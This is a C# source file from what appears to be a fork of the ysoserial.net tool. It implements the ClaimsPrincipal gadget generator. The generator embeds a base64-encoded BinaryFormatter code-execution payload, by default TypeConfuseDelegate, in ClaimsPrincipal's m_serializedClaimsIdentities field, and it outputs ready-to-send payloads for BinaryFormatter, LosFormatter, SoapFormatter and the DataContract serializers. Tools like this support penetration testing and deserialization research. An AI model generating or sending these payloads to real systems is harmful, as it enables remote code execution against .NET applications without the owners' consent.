using System;
using System.Collections.Generic;
using System.IO;
using ysonet.Helpers;
using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;

namespace ysonet.Generators
{
    public class ClaimsPrincipalGenerator : GenericGenerator
    {
        // Discovery facets (category search only): second-order BinaryFormatter sink
        // in ClaimsPrincipal (mscorlib, built-in).
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.NestedDeserialization)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // System.Security.Claims is 4.5+; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
        }


        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "SoapFormatter", "DataContractSerializer", "DataContractJsonSerializer", "NetDataContractSerializer", "LosFormatter" };
        }

        // ClaimsPrincipal is in mscorlib. The DataContract serializers import it as a data
        // contract whose optional string member m_serializedClaimsIdentities is the sink, so they
        // carry the inner payload directly. On deserialize, the [OnDeserialized] callback runs
        // DeserializeIdentities, which base64-decodes the field and runs a nested BinaryFormatter.
        private const string MscorlibAssembly = "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        private const string ClaimsContractNs = "http://schemas.datacontract.org/2004/07/System.Security.Claims";

        public override string Finders()
        {
            return "jang";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Bridged, GadgetTags.OnDeserialized, GadgetTags.SecondOrderDeserialization };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                binaryFormatterPayload = (byte[])new TypeConfuseDelegateGenerator().GenerateInner("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                string payload_bf_json = @"[{'Id': 1,
    'Data': {
      '$type': 'SerializationHeaderRecord',
      'binaryFormatterMajorVersion': 1,
      'binaryFormatterMinorVersion': 0,
      'binaryHeaderEnum': 0,
      'topId': 1,
      'headerId': -1,
      'majorVersion': 1,
      'minorVersion': 0
}},{'Id': 2,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 1,
      'name': 'System.Security.Claims.ClaimsPrincipal',
      'numMembers': 1,
      'memberNames':['m_serializedClaimsIdentities'],
      'binaryTypeEnumA':[1],
      'typeInformationA':[null],
      'typeInformationB':[null],
      'memberAssemIds':[0],
      'assemId': 0
}},{'Id': 10,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 5,
      'value': '" + b64encoded + @"'
}},{'Id': 11,
    'TypeName': 'MessageEnd',
    'Data': {
      '$type': 'MessageEnd'
}}]";

                MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(payload_bf_json);

                if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
                {
                    if (inputArgs.Test)
                    {
                        try
                        {
                            ms.Position = 0;
                            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                            bf.Deserialize(ms);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return ms.ToArray();
                }
                else
                {
                    // it is LosFormatter
                    byte[] lfSerializedObj = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms.ToArray());

                    MemoryStream ms2 = new MemoryStream(lfSerializedObj);
                    ms2.Position = 0;
                    if (inputArgs.Test)
                    {
                        try
                        {
                            System.Web.UI.LosFormatter lf = new System.Web.UI.LosFormatter();
                            lf.Deserialize(ms2);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return lfSerializedObj;
                }
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {

                string payload = "";

                payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
<a1:ClaimsPrincipal id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/ns/System.Security.Claims"">
<m_serializedClaimsIdentities id=""ref-5"">{b64encoded}</m_serializedClaimsIdentities>
</a1:ClaimsPrincipal>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";
                if (inputArgs.Minify)
                {

                    payload = XmlMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);

                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                string payload = $@"<root type=""System.Security.Claims.ClaimsPrincipal, {MscorlibAssembly}"">
<ClaimsPrincipal xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns=""{ClaimsContractNs}"">
<m_serializedClaimsIdentities>{b64encoded}</m_serializedClaimsIdentities>
</ClaimsPrincipal>
</root>";
                if (inputArgs.Minify)
                {
                    payload = inputArgs.UseSimpleType ? XmlMinifier.Minify(payload, new string[] { "mscorlib" }, null) : XmlMinifier.Minify(payload, null, null);
                }
                if (inputArgs.Test)
                {
                    try { SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type"); }
                    catch (Exception err) { Debugging.ShowErrors(inputArgs, err); }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {
                string payload = $@"<ClaimsPrincipal xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Id=""1"" z:Type=""System.Security.Claims.ClaimsPrincipal"" z:Assembly=""0"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns=""{ClaimsContractNs}"">
<m_serializedClaimsIdentities z:Id=""2"">{b64encoded}</m_serializedClaimsIdentities>
</ClaimsPrincipal>
";
                if (inputArgs.Minify)
                {
                    payload = inputArgs.UseSimpleType ? XmlMinifier.Minify(payload, new string[] { "mscorlib" }, null) : XmlMinifier.Minify(payload, null, null);
                }
                if (inputArgs.Test)
                {
                    try { SerializersHelper.NetDataContractSerializer_deserialize(payload); }
                    catch (Exception err) { Debugging.ShowErrors(inputArgs, err); }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractjsonserializer"))
            {
                string payload = $@"{{""m_serializedClaimsIdentities"":""{b64encoded}""}}";
                if (inputArgs.Minify)
                {
                    payload = inputArgs.UseSimpleType ? JsonMinifier.Minify(payload, new string[] { "mscorlib" }, null) : JsonMinifier.Minify(payload, null, null);
                }
                if (inputArgs.Test)
                {
                    try { SerializersHelper.DataContractJsonSerializer_deserialize(payload, "System.Security.Claims.ClaimsPrincipal, " + MscorlibAssembly, null); }
                    catch (Exception err) { Debugging.ShowErrors(inputArgs, err); }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
